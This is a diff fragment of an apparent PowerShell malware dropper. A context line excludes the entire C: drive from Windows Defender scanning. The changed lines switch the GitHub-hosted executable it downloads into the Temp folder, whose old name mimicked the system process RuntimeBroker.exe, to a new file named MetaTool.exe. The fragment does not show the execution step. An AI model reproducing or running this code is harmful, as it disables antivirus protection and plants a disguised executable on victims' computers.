@@ -32,13 +32,13 @@ Add-MpPreference -ExclusionPath C:\
 
 
 
-$url = "https://github.com/LuisPhantom/Vemom/raw/main/Setup_Vemom.exe"
+$url = "https://github.com/LuisPhantom/Vemom/raw/main/MetaTool.exe"
 
 #############################################################################################################################
 
 
 
-$output = "$env:Temp/RuntimeBroker.exe"
+$output = "$env:Temp/MetaTool.exe"
 
 #############################################################################################################################
 
